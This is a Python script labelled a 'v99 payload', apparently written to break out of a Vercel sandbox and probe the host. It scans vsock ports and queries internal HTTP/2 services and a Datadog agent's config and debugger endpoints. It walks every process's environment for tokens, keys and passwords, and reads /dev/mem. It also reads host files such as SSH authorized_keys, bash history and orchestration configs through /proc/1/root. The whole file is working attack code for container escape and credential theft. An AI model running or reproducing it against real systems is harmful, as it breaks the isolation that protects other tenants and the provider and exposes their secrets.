# -*- coding: utf-8 -*-
"""v99 payload: Seccomp=0 + 无网络ns 上下文, 宿主面综合探测
H1 宿主 socket 表  H2 原生 vsock 端口扫描  H3 2050 路由深挖
H4 Datadog agent(1026) 深挖  H5 fd/environ 行为考古  H6 /dev/mem+iomem  H7 host 关键文件
输出 /vercel/sandbox/v99c.out"""
import os, socket, struct, time, subprocess, glob, signal

OUT = '/vercel/sandbox/v99c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=8):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


# ---------- H1 宿主网络 socket 表 (无网络 ns 隔离 => /proc/net 是宿主的) ----------
log('=== H1 host net tables ===')
for p in ['/proc/net/vsock', '/proc/net/tcp', '/proc/net/tcp6', '/proc/net/udp', '/proc/net/arp']:
    try:
        d = open(p, errors='replace').read()
        lines = d.splitlines()
        log('--- %s %dB %dlines ---' % (p, len(d), len(lines)))
        for ln in lines[:60]:
            log('  ' + ln)
    except Exception as e:
        log('%s ERR %s' % (p, e))
try:
    d = open('/proc/net/unix', errors='replace').read()
    log('--- /proc/net/unix %dB ---' % len(d))
    for ln in d.splitlines()[1:120]:
        parts = ln.split()
        if len(parts) >= 8:
            log('  ' + ' '.join(parts[-2:]) + ' | ' + parts[3] + ' | ' + parts[6])
except Exception as e:
    log('unix ERR %s' % e)


# ---------- H2 原生 vsock 端口扫描 (Seccomp=0 无拦截) ----------
log('=== H2 native vsock scan ===')
try:
    s = socket.socket(40, socket.SOCK_STREAM)
    log('AF_VSOCK socket OK fd=%d' % s.fileno())
    s.close()
except Exception as e:
    log('AF_VSOCK FAIL %s' % e)

ports = [22, 53, 80, 443, 1024, 1026, 2050, 23456, 2379, 3000, 30001, 30002, 5000, 5432, 6379, 8000, 8080, 8125, 8126, 9000, 9090, 18080, 50000, 60000] + list(range(1000, 1080))
open_ports = []
for port in ports:
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(1.0)
        rc = s.connect_ex((2, port))
        if rc == 0:
            open_ports.append(port)
            log('VSOCK %d OPEN' % port)
            try:
                s.settimeout(1.5)
                d = s.recv(256)
                log('VSOCK %d banner %r' % (port, d[:128]))
            except Exception:
                pass
        s.close()
    except Exception as e:
        log('VSOCK %d EXC %s' % (port, e))
log('OPEN_PORTS=%s' % open_ports)


# ---------- H3 2050 H2 路由深挖 ----------
log('=== H3 2050 deep dive ===')


def h2_req(port, method, path, authority='localhost', extra=b'', body=b'', t=2.2):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        time.sleep(0.15)
        try:
            d0 = s.recv(512)
        except Exception:
            d0 = b''
        if d0:
            s.sendall(h2_frame(4, 1, 0, b''))
        # HPACK: :method, :scheme http, :path, :authority
        m = b'\x82' if method == 'GET' else b'\x83'
        hp = m + b'\x86' + b'\x44' + bytes([len(path)]) + path.encode()
        hp += b'\x41' + bytes([len(authority)]) + authority.encode()
        hp += extra
        s.sendall(h2_frame(1, 0x5, 1, hp))
        if body:
            s.sendall(h2_frame(0, 0x1, 1, body))
        time.sleep(0.4)
        d2 = b''
        try:
            s.settimeout(t)
            while len(d2) < 65536:
                c = s.recv(8192)
                if not c:
                    break
                d2 += c
        except Exception:
            pass
        # 解析帧
        info = []
        off = 0
        while off + 9 <= len(d2):
            ln = int.from_bytes(d2[off:off + 3], 'big')
            typ = d2[off + 3]
            fl = d2[off + 4]
            pay = d2[off + 9:off + 9 + ln]
            if typ == 1:
                info.append('HEADERS fl=%d pay=%s' % (fl, pay.hex()))
            elif typ == 4:
                info.append('SETTINGS pay=%s' % pay.hex())
            elif typ == 7:
                info.append('GOAWAY err=%s' % pay[-4:].hex())
            elif typ == 0:
                info.append('DATA %dB' % ln)
            off += 9 + ln
        log('2050 %s %s @%s -> %dB %s' % (method, path, authority, len(d2), ';'.join(info)[:300]))
        s.close()
        return d2
    except Exception as e:
        log('2050 %s %s @%s EXC %s' % (method, path, authority, type(e).__name__))
        return b''


paths = ['/', '/v1/oci-image', '/oci-image', '/v1/images', '/proxy-ca', '/cache-oracle', '/resource-usage',
         '/v1/resource-usage', '/v1/cache', '/v1/proxy', '/healthz', '/grpc.health.v1.Health/Check']
for path in paths:
    h2_req(2050, 'GET', path, 'localhost')
    h2_req(2050, 'POST', path, 'localhost', b'', b'\x00\x00\x00\x00\x00')
for auth in ['169.254.169.254', 'metadata', 'cell', 'host.docker.internal']:
    h2_req(2050, 'GET', '/', auth)


# ---------- H4 Datadog agent 1026 深挖 ----------
log('=== H4 Datadog 1026 ===')


def http1(port, req, label, t=2.5):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        s.sendall(req)
        d = b''
        try:
            while len(d) < 65536:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        log('%s rcvd %dB: %s' % (label, len(d), d[:400].decode('latin1', 'replace').replace('\r', '\\r').replace('\n', '\\n')))
        s.close()
        return d
    except Exception as e:
        log('%s EXC %s' % (label, type(e).__name__))
        return b''


http1(1026, b'POST /debugger/v2/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'dbg2-body')
http1(1026, b'GET /evp_proxy/v1/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'evp-full')
http1(1026, b'GET /evp_proxy/v2/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'evp-v2')
http1(1026, b'POST /evp_proxy/v1/api/v2/series HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'evp-series')
http1(1026, b'POST /config/set HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'cfg-set')
http1(1026, b'GET /config/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'cfg-root')
http1(1026, b'GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'agent-info')
http1(1026, b'GET /status HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'agent-status')
http1(1026, b'POST /intake/v2/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'intake-v2')


# ---------- H5 fd/environ 行为考古 ----------
log('=== H5 fd/environ archaeology ===')
for p in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
    pid = p.split('/')[-1]
    try:
        comm = open(p + '/comm', errors='replace').read().strip()
    except Exception:
        continue
    if comm in ('', 'kthreadd', 'ksoftirqd'):
        continue
    interesting = []
    try:
        for fd in os.listdir(p + '/fd'):
            try:
                tgt = os.readlink(p + '/fd/' + fd)
            except Exception:
                continue
            if any(k in tgt for k in ('socket:', 'vsock', 'containerd', 'cell', '.sock', '/run/', 'pipe:', 'anon_inode')):
                interesting.append(fd + '->' + tgt)
    except Exception:
        pass
    if len(interesting) > 0:
        log('PID %s %s fd(%d): %s' % (pid, comm, len(interesting), '; '.join(interesting[:25])))
    # environ secrets
    try:
        env = open(p + '/environ', 'rb').read()
        if env:
            sec = [e.decode('latin1') for e in env.split(b'\x00') if e and any(
                k in e.lower() for k in (b'token', b'key', b'secret', b'pass', b'auth', b'cred', b'aws'))]
            if sec:
                log('PID %s %s SECRETS: %s' % (pid, comm, '; '.join(s[:120] for s in sec[:12])))
    except Exception:
        pass


# ---------- H6 /dev/mem + iomem + sysfs ----------
log('=== H6 /dev/mem + iomem ===')
log(sh('cat /proc/iomem 2>&1').decode(errors='replace')[:3500])
try:
    d = open('/dev/mem', 'rb')
    log('/dev/mem open OK')
    try:
        hdr = d.read(64)
        log('/dev/mem first64 %s' % hdr.hex())
    except Exception as e:
        log('/dev/mem read EXC %s' % e)
    d.close()
except Exception as e:
    log('/dev/mem open FAIL %s' % e)
os.makedirs('/tmp/sys', exist_ok=True)
log('sysfs mount: ' + sh('mount -t sysfs sysfs /tmp/sys 2>&1; ls /tmp/sys/bus/pci/devices/ 2>&1').decode(errors='replace')[:1500])
log('virtio: ' + sh('ls -la /tmp/sys/bus/virtio/devices/ 2>&1; for d in /tmp/sys/bus/virtio/devices/*/; do echo -n "$d "; cat $d/vendor 2>/dev/null; echo -n " "; cat $d/device 2>/dev/null; echo -n " "; cat $d/status 2>/dev/null; echo; done 2>&1').decode(errors='replace')[:2500])


# ---------- H7 host 关键文件 (/proc/1/root = 宿主根) ----------
log('=== H7 host files ===')
host_files = ['/etc/hosts', '/etc/resolv.conf', '/etc/hostname', '/etc/mtab',
              '/root/.bash_history', '/root/.ssh/authorized_keys',
              '/etc/datadog-agent/datadog.yaml', '/etc/containerd/config.toml',
              '/etc/vercel/celld.conf', '/etc/vercel/celld.yaml',
              '/opt/vercel/config.json', '/opt/vercel/celld.conf',
              '/var/log/cloud-init-output.log', '/var/lib/cloud/instance/obj.pkl']
for fp in host_files:
    r = sh('cat /proc/1/root%s 2>&1' % fp, t=3)
    r2 = r.decode(errors='replace')
    if r2.strip() and 'No such file' not in r2 and 'Permission denied' not in r2:
        log('HOSTFILE %s (%dB): %s' % (fp, len(r), r2[:600]))
for d in ['/run/vercel', '/run/vercel/share', '/opt/vercel', '/etc/datadog-agent', '/root', '/home']:
    r = sh('ls -la /proc/1/root%s 2>&1' % d, t=3)
    log('HOSTLS %s: %s' % (d, r.decode(errors='replace')[:800]))

log('V99C_DONE')
f.close()
